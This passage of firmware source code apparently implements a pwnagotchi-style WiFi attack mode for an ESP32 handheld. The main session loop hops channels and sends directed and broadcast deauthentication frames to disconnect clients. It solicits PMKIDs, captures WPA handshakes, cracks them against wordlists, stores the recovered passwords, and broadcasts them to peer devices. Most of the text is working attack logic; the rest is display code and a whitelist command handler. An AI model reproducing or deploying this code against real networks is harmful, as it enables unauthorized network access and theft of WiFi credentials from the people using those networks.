            g.fillTriangle(cx - P(7), cy + P(16), cx - P(12) - flick, cy + P(14 + 5 * flame), cx - P(3), cy + P(16 + 4 * flame), t2);
            g.fillTriangle(cx + P(7), cy + P(16), cx + P(12) + flick, cy + P(14 + 5 * flame), cx + P(3), cy + P(16 + 4 * flame), t2);
        }
    } else {   // lonely: a tiny dying ember
        g.fillTriangle(cx, cy + P(20), cx - P(2), cy + P(27), cx + P(2), cy + P(27), PH_ORANGE);
    }
    // rising embers for crack / pwned
    if (m == PM_CRACK || m == PM_PWNED) {
        int span = P(26); if (span < 1) span = 1;
        int ey = cy + P(10) - (int)((fr * 3) % (unsigned)span);
        g.fillCircle(cx - P(8), ey, P(2), PH_GOLD); g.fillCircle(cx + P(8), ey + P(7), P(2), PH_GOLD);
        if (m == PM_PWNED) { g.fillCircle(cx - P(18), cy - P(18), P(2), PH_GOLD); g.fillCircle(cx + P(18), cy - P(16), P(2), PH_GOLD);
                             g.fillCircle(cx, cy - P(30), P(2), PH_CORE); }
    }
}

// ── main entry ────────────────────────────────────────────────────────────────
static bool argHas(const char* a, const char* w) { return a && strstr(a, w); }

static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
    DisplayManager& dm = displayManager;
    s_nTarg = 0; s_nCli = 0; s_nPeer = 0; s_metName[0] = 0;
    memset(&s_cap, 0, sizeof(s_cap)); s_priorityDone.clear(); s_sessionCaps.clear(); s_crackSkip.clear();
    s_dtxD = s_dtxB = s_txFail = s_m1Seen = s_m2Seen = 0;   // reset per-session diag counters
    s_rHead = s_rTail = 0;
    whitelistLoad();   // cache whitelist once (hot path checks RAM, not SD)

    // The AP interface MUST be up for esp_wifi_80211_tx() to actually put deauth/grid
    // frames on the air. Bare STA-unassociated TX (what pwn used to do) silently fails
    // to transmit → clients never get kicked → NO handshake ever caught. This mirrors
    // our proven ws/da/karma path (and Bruce/Marauder). Hidden SSID + 0 clients = a
    // minimal tell; the roam loop sets the real channel via esp_wifi_set_channel() each
    // hop, so the softAP "home" channel is cosmetic and gets overridden immediately.
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, 1, 1, 0, false);   // ssid,pass,ch,hidden,maxconn,ftm
    esp_wifi_get_mac(WIFI_IF_AP, s_apMac);        // so we can ignore our own AP's beacons
    esp_wifi_set_promiscuous(false);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&pwnRxCb);
    esp_wifi_set_promiscuous(true);
    s_sniffing = true;
    gridInitIdentity();   // grid MAC + name (needs WiFi started for esp_wifi_get_mac)
    DeauthAttack da(displayManager, wifiFunctions);   // proven deauth primitive (rule 5b)

    int nChans = fullChans ? 13 : (int)(sizeof(PWN_CHANS));
    int ci = 0;
    uint8_t curCh = fullChans ? 1 : PWN_CHANS[0];
    uint32_t apCount = 0, hsCount = 0, pmCount = 0, pwnedCount = 0;
    char ticker[40] = "roaming...";
    char mood[10] = "IDLE";
    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0, lastMoodEvt = 0, lastM1Ms = 0, gridTxAt = 0, reDeauthAt = 0, learnSaveAt = 0;
    int attackRot = 0, focusIdx = -1;   // round-robin so each AP gets a focused, collision-free attempt
    uint8_t  hotChan = 0;               // channel with live handshake (M1) activity — hold & keep trying
    uint32_t hotUntil = 0, hotStart = 0;
    if (s_aiOn) learnLoad(); else learnReset();   // adaptive roaming table (decayed on load)
    if (s_aiOn && s_aiDebug) aiDbgSession(mode, fullChans);
    float curReward = 0;                // reward accrued on the CURRENT channel this dwell
    int   apBase = 0, cliBase = 0;      // AP/client counts at dwell start (for new-discovery reward)
    bool running = true;
    char toast[28] = {0};
    uint32_t t0Session = millis();

    // layout + double-buffered phoenix box
    const int BOX_X = 6, BOX_W = 216, BOX_H = 158, BOX_Y = outputY + 18;   // big ember chamber
    const int RX = BOX_X + BOX_W + 4;               // right stats column x (=226)
    const int BY = BOX_Y + BOX_H + 4;               // below-box strip y
    LGFX_Sprite phx(&tft);
    phx.setColorDepth(16);
    phx.setPsram(true);                             // PSRAM sprite (keep DRAM free for WiFi)
    bool haveSpr = phx.createSprite(BOX_W, BOX_H);

    // static chrome: header + maroon rule (dynamic values drawn per-frame with a bg
    // colour so they overwrite in place — no full-screen flicker)
    auto drawChrome = [&]() {
        dm.clearScreen(); dm.setDefaultTextSize();
        dm.setCursor(4, outputY);
        dm.setTextColor(PH_DIM);   dm.printText("[");
        dm.setTextColor(TFT_CYAN); dm.printText("PWN");
        dm.setTextColor(PH_DIM);   dm.printText("::");
        dm.setTextColor(PH_AMBER); dm.printText(modeName(mode));
        dm.setTextColor(PH_DIM);   dm.printText("]  ");
        dm.setTextColor(0x07FF);   dm.printText(s_gridName);   // this device's own grid name
        if (!s_haveSd) { dm.setTextColor(PH_AMBER); dm.printText("  NO-SD"); }  // RAM crack + NVS save
        dm.println("");
        tft.fillRect(4, BOX_Y - 4, SCREEN_WIDTH - 8, 2, PH_MAROON);
    };
    drawChrome();

    while (running) {
        uint32_t now = millis();

        // Do NOT hop while a handshake is mid-flight (M1 seen, waiting for M2) — stay on
        // channel to catch M2 instead of jumping away and losing it (the main capture bug).
        bool midCapture = s_cap.active && s_cap.haveM1 && !s_cap.haveM2;

        // HOT-CHANNEL HOLD: a client is actively handshaking on this channel (recent M1), so
        // stay put and keep kicking it to complete the 4-way instead of wandering off — each
        // M1 refreshes the window (PWN_HOT_MS), capped so we never camp one stubborn channel
        // forever (PWN_HOT_MAX). This is what turns "saw M1 five times, caught it on the
        // sixth" into catching it on the first or second.
        bool hotHold = (curCh == hotChan) && (now < hotUntil) && (now - hotStart < PWN_HOT_MAX);

        // channel dwell / hop
        if (now >= hopAt && !midCapture && !hotHold) {
            // AI: credit the channel we're LEAVING with what it produced, then let the
            // bandit choose where to go next (else plain round-robin).
            uint8_t aiLeftCh = curCh; float aiLeftRew = 0;   // captured for the debug trace
            if (s_aiOn) {
                uint8_t setArr[13]; int setN;
                if (fullChans) { setN = 13; for (int i = 0; i < 13; i++) setArr[i] = i + 1; }
                else           { setN = (int)sizeof(PWN_CHANS); for (int i = 0; i < setN; i++) setArr[i] = PWN_CHANS[i]; }
                curReward += 1.0f * (float)(s_nTarg - apBase) + 2.0f * (float)(s_nCli - cliBase); // new APs/clients
                // STANDING presence reward: a channel that HOSTS un-captured prey keeps
                // out-scoring an empty one every visit (not just on first discovery) — this
                // is what makes it converge to where the networks actually live, vs the
                // discovery-only reward that decays to 0 once the area is mapped.
                int present = 0;
                for (int i = 0; i < s_nTarg; i++)
                    if (s_targ[i].ch == curCh && !s_targ[i].captured && !s_targ[i].wl) present++;
                if (present > PWN_PRESENCE_CAP) present = PWN_PRESENCE_CAP;
                curReward += PWN_PRESENCE_W * (float)present;
                aiLeftRew = curReward;
                learnUpdate(curCh, curReward);
                curCh = learnPick(setArr, setN);
            } else {
                curCh = fullChans ? (uint8_t)(ci + 1) : PWN_CHANS[ci];
                ci = (ci + 1) % nChans;
            }
            curReward = 0; apBase = s_nTarg; cliBase = s_nCli;   // reset dwell accumulators
            esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
            // FOCUS one un-captured target per dwell (rotating). A single capture buffer
            // means simultaneous handshakes collide, so we work ONE AP at a time like ws.
            // Like pwnagotchi: PREFER an AP with a KNOWN client (recon → targeted deauth) —
            //   pass 0 = require a discovered client (directed deauth, most effective),
            //   pass 1 = active-only fallback to any AP (a client we haven't sampled yet).
            focusIdx = -1;
            for (int pass = 0; pass < 2 && focusIdx < 0 && mode != PWN_PASSIVE; pass++) {
                if (mode == PWN_STEALTH && pass == 1) break;      // stealth never blind-deauths
                for (int k = 0; k < s_nTarg; k++) {
                    int i = (attackRot + k) % s_nTarg;
                    if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
                    if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
                    const uint8_t* c = cliFor(s_targ[i].bssid);
                    if (pass == 0 && !c) continue;               // pass 0 needs a known client
                    sendDeauth(da, s_targ[i].bssid, c);          // directed if client known, else broadcast
                    focusIdx = i; attackRot = i + 1; reDeauthAt = now + 900;
                    break;                                        // one AP this dwell
                }
            }
            // STEALTH clientless: if the deauth passes above focused nothing (no known
            // client on this channel), still focus one AP for a solicitation-ONLY attempt
            // — the quiet PMKID-first path that needs no client and kicks no one.
            if (mode == PWN_STEALTH && focusIdx < 0) {
                for (int k = 0; k < s_nTarg; k++) {
                    int i = (attackRot + k) % s_nTarg;
                    if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
                    if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
                    focusIdx = i; attackRot = i + 1; reDeauthAt = now + 900;
                    break;
                }
            }
            // PMKID-first: solicit an M1/PMKID from the focused AP (clientless, both active
            // + stealth). Cheap addition on top of whatever deauth ran above; on a
            // PMKID-caching AP this alone completes the capture with no client + no deauth.
            if (focusIdx >= 0 && mode != PWN_PASSIVE)
                solicitPmkid(s_targ[focusIdx].bssid, s_targ[focusIdx].ssid);
            // adaptive dwell — a productive channel earns up to ~2× the base (Pwnagotchi's
            // recon_time lever); plain base when AI off.
            uint32_t dwell = PWN_RECON_MS;
            if (s_aiOn) {
                float f = learnMean(curCh) / PWN_REWARD_CAP; if (f > 1.0f) f = 1.0f; if (f < 0) f = 0;
                dwell = (uint32_t)(PWN_RECON_MS * (1.0f + f));
            }
            if (mode == PWN_STEALTH) dwell += esp_random() % 1500;   // jitter
            hopAt = now + dwell;
            if (s_aiOn && s_aiDebug) aiDbgHop(now, aiLeftCh, aiLeftRew, curCh, dwell, fullChans);
        }

        // keep kicking the FOCUSED target through the dwell until it hands over a handshake
        // (mirrors ws's persistence on one AP); paused while a capture is already mid-flight.
        if (focusIdx >= 0 && focusIdx < s_nTarg && !midCapture && mode != PWN_PASSIVE &&
            !s_targ[focusIdx].captured && now >= reDeauthAt) {
            const uint8_t* c = cliFor(s_targ[focusIdx].bssid);
            solicitPmkid(s_targ[focusIdx].bssid, s_targ[focusIdx].ssid);   // keep soliciting (clientless)
            if (mode == PWN_STEALTH) { if (c) sendDeauth(da, s_targ[focusIdx].bssid, c); }
            else sendDeauth(da, s_targ[focusIdx].bssid, c);   // directed if client known, else broadcast
            reDeauthAt = now + 900;
        }

        // drain sniffed frames
        char ev = drainOne(curCh);
        if (ev == 'B') { apCount = s_nTarg; }
        else if (ev == '1') { s_m1Seen++; strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; curReward += 3.0f; // M1 = active client
                              if (hotChan != curCh || now >= hotUntil) hotStart = now;   // start of a fresh hot period
                              hotChan = curCh; hotUntil = now + PWN_HOT_MS; }             // stay here & keep trying
        else if (ev == '2') { s_m2Seen++; strcpy(mood, "EXCITED"); lastMoodEvt = now; }
        else if (ev == 'G') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // met a grid peer
                              snprintf(ticker, sizeof(ticker), "met %.12s", s_metName); }
        else if (ev == 'C') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // a peer shared a crack
                              snprintf(ticker, sizeof(ticker), "learned %.12s", s_credRxSsid); }

        // Persist a credential a peer shared over the grid (staged by drainOne; SD/NVS write
        // kept off the drain hot path). Same routing as our own cracks: no SD → NVS, SD → csv.
        if (s_credRxPending) {
            pwnPersistCred(s_credRxBssid, s_credRxSsid, s_credRxPsk);
            s_gridLearned.push_back(String(s_credRxSsid));
            s_credRxPending = false;
        }

        // grid broadcast (active + passive only; stealth stays dark). RX runs in every mode.
        // The advert TX sweeps all channels then restores curCh, so peers rendezvous regardless
        // of each deck's roam channel (see gridSendAdv).
        if (mode != PWN_STEALTH && now >= gridTxAt) {
            gridTxAt = now + PWN_GRID_TX_MS;
            gridSendAdv(pwnedCount, hsCount, pmCount, (uint16_t)((now - t0Session) / 60000), curCh);
            if (s_shareReps > 0) {                       // re-broadcast a fresh local crack (lossy air)
                gridSendCred(s_shareSsid, s_sharePsk, s_shareBssid, curCh);
                s_shareReps--;
            }
        }
        // expire peers not heard from in a while
        for (int i = 0; i < s_nPeer; )
            if (now - s_peer[i].lastSeenMs > PWN_PEER_TTL_MS) s_peer[i] = s_peer[--s_nPeer];
            else i++;

        // periodic checkpoint of the learned table (every 2 min) so a crash / power-off
        // can't cost a session — GDMA-safe (learnSave pauses promiscuous internally). SD only.
        if (s_aiOn && s_haveSd) {
            if (learnSaveAt == 0) learnSaveAt = now + 120000;
            else if (now >= learnSaveAt) { learnSave(); learnSaveAt = now + 120000; }
        }

        // complete a capture?
        if (s_cap.active && s_cap.haveM1 && (s_cap.haveM2 || s_cap.m1HasPmkid)) {
            bool wasHs = s_cap.haveM2;
            PwnTarget* tt = targFind(s_cap.bssid);
            flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
            if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s",
                                             s_haveSd ? s_lastSaveFile + sizeof(SD_DIR_PWN) : "cracking..."); }
            else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID %s", s_haveSd ? "captured" : "cracking..."); }
            strcpy(mood, "EXCITED"); lastMoodEvt = now; curReward += 10.0f;   // capture = the payoff
            hotChan = 0; hotUntil = 0;   // got it — release the hot-hold and move on
        }

        // Abandon a stale incomplete capture (an M1 that never got its M2/PMKID). Without
        // this s_cap.active stays set forever and blocks BOTH new captures and idle
        // cracking — the "found APs but stuck on IDLE, never cracks" bug.
        // 6s (was 3s): gives the 4-way time to finish M2 when the target channel is
        // revisited sparsely (full-13 roam) — 3s dropped handshakes that 1/6/11 caught.
        if (s_cap.active && (now - s_cap.startMs) > 6000) s_cap.active = false;

        // CRACK ONLY IN FREE TIME (capture is ALWAYS the priority). While there is any
        // un-captured prey in range OR a capture in flight, do NOT crack — hunt. When the
        // air is genuinely quiet, crack ONE short batch, then drop back to the loop to
        // re-scan the air (drain + re-assess prey) before the next batch — so the instant a
        // target appears we bail cracking and return to the deauth/capture main phase.
        int preyInRange = 0;
        for (int i = 0; i < s_nTarg; i++)
            if (!s_targ[i].captured && !s_targ[i].wl &&
                (s_targ[i].rssi == 0 || s_targ[i].rssi >= PWN_RSSI_CUTOFF)) preyInRange++;
        bool captureWork = (preyInRange > 0) || s_cap.active;       // something to hunt/finish
        // free time + M1-settle guard + a startup warm-up: the first ~sweep is spent
        // DISCOVERING the environment. Cracking pauses promiscuous, so we must actually
        // listen before concluding "nothing to capture" — else a fresh session goes deaf on
        // its backlog instead of finding the APs around it (12s ≈ one 1/6/11 sweep).
        bool canCrack = s_haveSd && !captureWork && (now - lastM1Ms) > 1200 && (now - t0Session) > 12000;
        if (canCrack && now >= crackAt) {
            bool didWork = false;
            {   // GDMA (fix #2): a crack batch reads the SD (dir list, .cap, wordlist) and
                // needs no radio — pause the promiscuous RX firehose around it. The deaf
                // window only happens when there's nothing worth hearing (we're idle).
                ScopedPromiscPause _;
                std::vector<String> caps;
                if (backlog) {                                 // all caps on disk
                    File d = SD.open(SD_DIR_PWN);
                    if (d && d.isDirectory()) {
                        for (File f = d.openNextFile(); f; f = d.openNextFile()) {
                            if (!f.isDirectory()) {
                                String nm = f.name(); String low = nm; low.toLowerCase();
                                if (low.endsWith(".cap")) {
                                    int sl = nm.lastIndexOf('/');
                                    caps.push_back(SD_DIR_PWN "/" + (sl >= 0 ? nm.substring(sl + 1) : nm));
                                }
                            }
                            f.close();
                        }
                    }
                    if (d) d.close();
                } else {
                    caps = s_sessionCaps;                      // [k] session-only: just this run's caps
                }
                for (auto& cp : caps) {                         // first cap that actually has work wins
                    bool skip = false;                          // already solved/exhausted this session?
                    for (auto& s : s_crackSkip) if (s == cp) { skip = true; break; }
                    if (skip) continue;
                    char found[64] = {0}, ss[33] = {0}, prog[16] = {0}; uint8_t cbss[6] = {0};
                    int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog, cbss);
                    if (r == -1) { s_crackSkip.push_back(cp); continue; }   // nothing more here — never retry
                    didWork = true;
                    if (r == 1) { pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
                        snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found);
                        pwnShareCred(cbss, ss, found); }                    // tell the pack (TX gated on mode)
                    else { strcpy(mood, "CRACK");
                        snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
                    lastMoodEvt = now;
                    break;                                      // one batch, then re-check the air
                }
            }
            // Keep cracking back-to-back while there's progress (next iteration re-checks the
            // air first); back off hard once the whole backlog is solved/exhausted so we don't
            // re-scan the SD every loop (spin guard).
            crackAt = now + (didWork ? 0 : 12000);
        }

        // Cardless RAM crack: no .cap backlog — crack the single stashed job off the built-in
        // list in short slices. Runs opportunistically (even with prey around, since the slot
        // holds only one HS and the slice is short); PWNED → NVS save + grid share.
        if (!s_haveSd && s_ramJobActive && (now - lastM1Ms) > 800 && now >= crackAt) {
            char found[64] = {0}; int r;
            { ScopedPromiscPause _; r = pwnRamCrackSlice(found, sizeof(found)); }
            if (r == 1) {
                pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
                snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", s_ramJob.ssid, found);
                pwnPersistCred(s_ramJobBssid, s_ramJob.ssid, found);   // → NVS "wifi"
                pwnShareCred(s_ramJobBssid, s_ramJob.ssid, found);     // tell the pack
                s_ramJobActive = false; lastMoodEvt = now; crackAt = now;
            } else if (r == -1) {
                strcpy(mood, "HUNT");
                snprintf(ticker, sizeof(ticker), "%.14s not in list", s_ramJob.ssid);
                s_ramJobActive = false; lastMoodEvt = now; crackAt = now + 3000;
            } else {
                strcpy(mood, "CRACK");
                snprintf(ticker, sizeof(ticker), "crack %.14s  %ld/%d", s_ramJob.ssid,
                         s_ramJobIdx, (int)wpacrack::kBuiltinCount);
                lastMoodEvt = now; crackAt = now;
            }
        }

        // resting mood after a quiet stretch: HUNT while un-captured prey is in range
        // (the normal roaming state), IDLE when everything around is already captured,
        // LONELY when no APs at all.
        if ((now - lastMoodEvt) > 2500 && !s_cap.active) {
            int prey = 0;
            for (int i = 0; i < s_nTarg; i++) if (!s_targ[i].captured && !s_targ[i].wl) prey++;
            strcpy(mood, s_nTarg == 0 ? "LONELY" : prey > 0 ? "HUNT" : "IDLE");
        }

        // redraw ~8fps (phoenix animates)
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { drawChrome(); drawAt = 0; }
        if (now - drawAt >= 120 && !displayManager.isBlocked()) {
            drawAt = now; frame++;
            int mid = moodId(mood);
            bool celebrate = (now < pwnFlash) && ((now / 200) & 1);
            char l[52];

            // strongest live signal (uncaptured targets)
            int8_t best = 0;
            for (int i = 0; i < s_nTarg; i++)
                if (!s_targ[i].captured && !s_targ[i].wl && s_targ[i].rssi != 0 && (best == 0 || s_targ[i].rssi > best))
                    best = s_targ[i].rssi;
            int bars = best == 0 ? 0 : best >= -55 ? 4 : best >= -67 ? 3 : best >= -77 ? 2 : best >= -86 ? 1 : 0;

            // ── big phoenix ember chamber (double-buffered) ──
            if (haveSpr) {
                phx.fillSprite(celebrate ? PH_ORANGE : PH_BOXBG);
                drawPhoenix(phx, BOX_W / 2, 74, mid, frame, 1.6f, (int)mode);
                phx.drawRoundRect(0, 0, BOX_W, BOX_H, 6, PH_BOXBRD);
                phx.drawRoundRect(1, 1, BOX_W - 2, BOX_H - 2, 6, PH_BOXBRD);
                phx.pushSprite(BOX_X, BOX_Y);
            }

            // ── right stats column (bg colour → in-place overwrite, no flicker) ──
            uint16_t mc = mid == PM_PWNED ? PH_GOLD : mid == PM_HUNT ? PH_AMBER : mid == PM_CRACK ? PH_ORANGE : TFT_CYAN;
            tft.fillRect(RX, BOX_Y, SCREEN_WIDTH - RX, 20, TFT_BLACK);
            tft.setTextSize(2); tft.setTextColor(mc, TFT_BLACK); tft.setCursor(RX, BOX_Y); tft.print(mood);
            tft.setTextSize(1);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 24);
            if (s_aiOn) {                              // brain readout: current ch + learned favorite
                uint8_t setA[13]; int setNn;
                if (fullChans) { setNn = 13; for (int i = 0; i < 13; i++) setA[i] = i + 1; }
                else           { setNn = (int)sizeof(PWN_CHANS); for (int i = 0; i < setNn; i++) setA[i] = PWN_CHANS[i]; }
                uint8_t fav = learnFavorite(setA, setNn);
                snprintf(l, sizeof(l), "c%-2u AI>c%-2u g%-2d", curCh, fav, s_nPeer);   // g = grid peers
            }
            else snprintf(l, sizeof(l), "%-7s ch%-2u g%-2d", modeName(mode), curCh, s_nPeer);
            tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 40); tft.print("SIGNAL");
            for (int i = 0; i < 4; i++) tft.fillRect(RX + i * 14, BOX_Y + 52, 11, 13, i < bars ? TFT_GREEN : PH_ASHDK);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 72);
            snprintf(l, sizeof(l), "UP %lum   ", (unsigned long)((now - t0Session) / 60000)); tft.print(l);
            tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.setCursor(RX, BOX_Y + 88);
            snprintf(l, sizeof(l), "%u APs    ", (unsigned)apCount); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 106);
            snprintf(l, sizeof(l), "HS %-4u", (unsigned)hsCount); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 120);
            snprintf(l, sizeof(l), "PMKID %-4u", (unsigned)pmCount); tft.print(l);
            // PWNED chip
            tft.drawRect(RX, BOX_Y + 134, SCREEN_WIDTH - RX - 4, 16, PH_MAROON);
            tft.setTextColor(PH_MAROON, TFT_BLACK); tft.setCursor(RX + 3, BOX_Y + 138); tft.print("PWNED");
            tft.setTextColor(PH_GOLD, TFT_BLACK); tft.setCursor(RX + 62, BOX_Y + 138);
            snprintf(l, sizeof(l), "%-3u", (unsigned)pwnedCount); tft.print(l);

            // ── below-box strip: ticker (or toast) + footer ──
            if (now < toastUntil) { tft.setTextColor(TFT_YELLOW, TFT_BLACK); snprintf(l, sizeof(l), "%-42.42s", toast); }
            else { tft.setTextColor(PH_AMBER, TFT_BLACK); snprintf(l, sizeof(l), "> %-40.40s", ticker); }
            tft.setCursor(6, BY); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(6, BY + 14);
            snprintf(l, sizeof(l), "[m]mode [c]%s [k]%s [a]ai:%s [q]quit ",
                     fullChans ? "all" : "1/6/11", backlog ? "all" : "sess",
                     s_aiOn ? (s_aiDebug ? "on*" : "on") : "off");   // * = debug trace active
            tft.print(l);
        }

        // input
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') running = false;
        else if (k == 'm' || k == 'M') { mode = (PwnMode)((mode + 1) % 3); drawChrome(); drawAt = 0; }
        else if (k == 'c' || k == 'C') { fullChans = !fullChans; nChans = fullChans ? 13 : (int)sizeof(PWN_CHANS); ci = 0;
                                         snprintf(toast, sizeof(toast), "channels: %s", fullChans ? "1-13" : "1/6/11");
                                         toastUntil = now + 1500; drawAt = 0; }
        else if (k == 'k' || k == 'K') { backlog = !backlog;
                                         snprintf(toast, sizeof(toast), "crack: %s", backlog ? "all backlog" : "session only");
                                         toastUntil = now + 1500; drawAt = 0; }
        else if (k == 's' || k == 'S') { snprintf(toast, sizeof(toast), "AP%u HS%u PM%u PWN%u", (unsigned)apCount,
                                         (unsigned)hsCount, (unsigned)pmCount, (unsigned)pwnedCount);
                                         toastUntil = now + 2000; drawAt = 0; }
        else if (k == 'a' || k == 'A') { s_aiOn = !s_aiOn;             // live toggle for A/B testing —
                                         // KEEP the in-RAM learned table (do NOT reload from disk, which
                                         // would clobber a session's learning with the stale file).
                                         snprintf(toast, sizeof(toast), "adaptive roam: %s", s_aiOn ? "ON" : "off");
                                         toastUntil = now + 1500; drawAt = 0; }

        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // teardown (GDMA-safe): stop TX/promiscuous, drop the softAP, leave WiFi STA-idle
    s_sniffing = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    if (s_aiOn && s_haveSd) learnSave();   // persist the learned channel table (radio fully idle now; SD only)
    if (haveSpr) phx.deleteSprite();
    dm.clearScreen();
    dm.printCommandScreen();
}

// ── whitelist subcommands ─────────────────────────────────────────────────────
static void wlList(DisplayManager& dm) {
    dm.clearScreen(); dm.setCursor(4, outputY);
    dm.setTextColor(TFT_CYAN); dm.println("[PWN WHITELIST]"); dm.printSeparator();
    int n = 0;
    if (!s_haveSd) {                                     // cardless: render the RAM whitelist
        for (auto& b : s_wlBssid) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
            char r[46]; snprintf(r, sizeof(r), "[%d] bssid,%.30s", n, b.c_str()); dm.println(r); n++; }
        for (auto& s : s_wlSsid)  { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
            char r[46]; snprintf(r, sizeof(r), "[%d] ssid,%.30s", n, s.c_str()); dm.println(r); n++; }
        if (!n) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("(empty)"); }
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(PH_AMBER);
        dm.println("RAM only (no SD) - clears on reboot");
        dm.printCommandScreen(); return;
    }
    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
    if (f) {
        while (f.available()) {
            String ln = f.readStringUntil('\n'); ln.trim();
            if (!ln.length() || ln[0] == '#') continue;
            dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
            char b[46]; snprintf(b, sizeof(b), "[%d] %.38s", n, ln.c_str()); dm.println(b); n++;
        }
        f.close();
    }
    if (!n) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("(empty)"); }
    dm.printCommandScreen();
}
static void wlAppend(const char* type, const char* value, const char* label) {
    if (!s_haveSd) {                                     // cardless: session-only RAM whitelist
        if (!strcmp(type, "bssid")) { String m = wlNormalizeMac(value); if (m.length()) s_wlBssid.push_back(m); }
        else if (!strcmp(type, "ssid")) { String n(value); n.trim(); if (n.length()) s_wlSsid.push_back(n); }
        return;
    }
    sdCardManager.ensureDir(SD_DIR_PWN);
    File f = SD.open(PWN_F_WHITELIST, FILE_APPEND);
    if (!f) return;
    f.printf("%s,%s,%s\n", type, value, label ? label : "");
    f.close();
}

void runPwn(char* args) {
    DisplayManager& dm = displayManager;
    // No SD is no longer fatal — pwn degrades to a RAM-only run: capture + crack one HS
    // at a time off the built-in list, save cracked creds to NVS, whitelist lives in RAM,
    // and the grid still works fully. Only .cap/backlog/persistence are skipped.
    s_haveSd = sdCardManager.canAccessSD();
    if (s_haveSd) sdCardManager.ensureDir(SD_DIR_PWN);

    char buf[128]; buf[0] = 0;
    if (args) { strncpy(buf, args, sizeof(buf) - 1); }
    char* tok = strtok(buf, " ");

    // whitelist subcommands: pwn wl [list|add ...|rm <n>|clear]
    if (tok && (!strcmp(tok, "wl") || !strcmp(tok, "whitelist"))) {
        char* sub = strtok(nullptr, " ");
        if (!sub || !strcmp(sub, "list")) { wlList(dm); return; }
        if (!strcmp(sub, "clear")) {
            if (!s_haveSd) { s_wlBssid.clear(); s_wlSsid.clear(); }
            else SD.remove(PWN_F_WHITELIST);
            wlList(dm); return;
        }
        if (!strcmp(sub, "add")) {
            char* a1 = strtok(nullptr, " ");
            if (!a1) { dm.println("usage: pwn wl add <idx|bssid>|ssid <name>"); dm.printCommandScreen(); return; }
            if (!strcmp(a1, "ssid")) {
                char* nm = strtok(nullptr, "");             // rest of line = name
                if (!nm || !*nm) { dm.println("usage: pwn wl add ssid <name>"); dm.printCommandScreen(); return; }
                while (*nm == ' ') nm++;
                wlAppend("ssid", nm, "");
                dm.clearScreen(); dm.setCursor(4, outputY);   // dedicated confirm (wlList would wipe it)
                dm.setTextColor(TFT_GREEN);
                char b[52]; snprintf(b, sizeof(b), "Whitelisted SSID: %.28s", nm); dm.println(b);
                dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_YELLOW);
                dm.println("WARN: skips ALL APs with this name.");
                dm.printCommandScreen(); return;
            }
            uint8_t bssid[6]; char ssid[33] = {0};
            if (macParse(a1, bssid)) { char m[18]; macStr(bssid, m); wlAppend("bssid", m, ""); }
            else {                                          // treat as sw index
                int idx = atoi(a1); int ch;
                if (!wifiFunctions.isScanDone() || !wifiFunctions.getNetworkInfo(idx, bssid, &ch)) {
                    dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_RED);
                    dm.println("Bad index — run sw first."); dm.printCommandScreen(); return;
                }
                wifiFunctions.getNetworkSSID(idx, ssid);
                char m[18]; macStr(bssid, m); wlAppend("bssid", m, ssid);
            }
            wlList(dm); return;
        }
        if (!strcmp(sub, "rm")) {
            char* a1 = strtok(nullptr, " "); int target = a1 ? atoi(a1) : -1;
            if (!s_haveSd) {                            // cardless: erase from the RAM vectors
                int nb = (int)s_wlBssid.size();         // list order = bssid rows, then ssid rows
                if (target >= 0 && target < nb) s_wlBssid.erase(s_wlBssid.begin() + target);
